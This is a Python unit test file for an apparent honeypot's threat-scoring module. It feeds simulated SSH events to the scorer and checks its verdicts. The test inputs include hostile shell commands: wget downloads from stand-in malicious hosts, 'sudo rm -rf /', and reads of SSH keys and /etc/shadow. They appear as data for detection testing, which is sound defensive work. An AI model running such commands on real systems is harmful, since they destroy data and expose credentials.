import unittest
from baitbox.anomaly import analyze_event, get_threat_score, _ip_metrics


class AnomalyTests(unittest.TestCase):
    def setUp(self):
        # Clear metrics for isolated test runs
        _ip_metrics.clear()

    def test_low_threat_by_default(self):
        res = get_threat_score("192.0.2.1")
        self.assertEqual(res["threat_level"], "LOW")
        self.assertEqual(res["threat_score"], 0)

    def test_failed_login_threat_score(self):
        ip = "192.0.2.2"
        # Simulate 6 login attempts (slow/spread out, not rapid)
        import time
        now = time.time()
        _ip_metrics[ip]["auth_attempts"] = [now - 50, now - 40, now - 30, now - 20, now - 15, now - 12]

        res = get_threat_score(ip)
        # Should flag "Multiple failed login attempts" -> +15 score -> LOW
        self.assertEqual(res["threat_level"], "LOW")
        self.assertEqual(res["threat_score"], 15)
        self.assertIn("Multiple failed login attempts", res["reasons"])


    def test_high_frequency_auth_attempts(self):
        ip = "192.0.2.3"
        # Simulate 4 rapid auth attempts
        for _ in range(4):
            analyze_event({
                "src_ip": ip,
                "event_type": "auth_attempt",
                "payload": {"username": "admin"},
                "protocol": "SSH"
            })

        res = get_threat_score(ip)
        # High frequency auth attempts -> +30 score -> MEDIUM
        self.assertEqual(res["threat_level"], "MEDIUM")
        self.assertEqual(res["threat_score"], 30)

    def test_high_risk_commands(self):
        ip = "192.0.2.4"
        analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "payload": {"command": "wget http://malicious.com/payload"},
            "protocol": "SSH"
        })
        res = get_threat_score(ip)
        # High risk command -> +30 -> MEDIUM
        self.assertEqual(res["threat_level"], "MEDIUM")
        self.assertEqual(res["threat_score"], 30)
        self.assertIn("Flagged high-risk commands (e.g. wget, curl, chmod)", res["reasons"])

    def test_privilege_escalation_by_username(self):
        ip = "192.0.2.5"
        # Login as root directly
        analyze_event({
            "src_ip": ip,
            "event_type": "auth_attempt",
            "payload": {"username": "root"},
            "protocol": "SSH"
        })
        res = get_threat_score(ip)
        # Root login -> privilege escalation -> +25 -> LOW (under 30)
        self.assertEqual(res["threat_level"], "LOW")
        self.assertEqual(res["threat_score"], 25)

    def test_privilege_escalation_by_command(self):
        ip = "192.0.2.6"
        analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "payload": {"command": "sudo rm -rf /"},
            "protocol": "SSH"
        })
        res = get_threat_score(ip)
        # sudo (+25) & rm -rf (+30) -> 55 -> MEDIUM
        self.assertEqual(res["threat_level"], "MEDIUM")
        self.assertEqual(res["threat_score"], 55)

    def test_sensitive_ssh_key_access(self):
        ip = "192.0.2.9"
        analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "payload": {"command": "cat ~/.ssh/authorized_keys"},
            "protocol": "SSH"
        })
        res = get_threat_score(ip)
        self.assertEqual(res["threat_score"], 20)
        self.assertIn("Suspicious file/directory access patterns (e.g. /etc/passwd, .env)", res["reasons"])

    def test_rapid_command_iteration(self):
        ip = "192.0.2.7"
        # Execute 5 commands rapidly
        for i in range(5):
            analyze_event({
                "src_ip": ip,
                "event_type": "command",
                "payload": {"command": f"echo {i}"},
                "protocol": "SSH"
            })
        res = get_threat_score(ip)
        # Rapid command execution -> +35 -> MEDIUM
        self.assertEqual(res["threat_level"], "MEDIUM")
        self.assertEqual(res["threat_score"], 35)

    def test_critical_threat_accumulation(self):
        ip = "192.0.2.8"
        # Root login (+25 priv_esc)
        # wget (+30 high_risk)
        # sudo cat /etc/shadow (+20 file_access)
        # 5 rapid commands (+35 rapid)
        # Total = 25 + 30 + 20 + 35 = 110 -> capped at 100 -> CRITICAL
        analyze_event({
            "src_ip": ip,
            "event_type": "auth_attempt",
            "payload": {"username": "root"},
            "protocol": "SSH"
        })
        analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "payload": {"command": "wget http://bad.site/malware"},
            "protocol": "SSH"
        })
        analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "payload": {"command": "sudo cat /etc/shadow"},
            "protocol": "SSH"
        })
        for i in range(5):
            analyze_event({
                "src_ip": ip,
                "event_type": "command",
                "payload": {"command": f"echo {i}"},
                "protocol": "SSH"
            })
        res = get_threat_score(ip)
        self.assertEqual(res["threat_level"], "CRITICAL")
        self.assertEqual(res["threat_score"], 100)



if __name__ == "__main__":
    unittest.main()
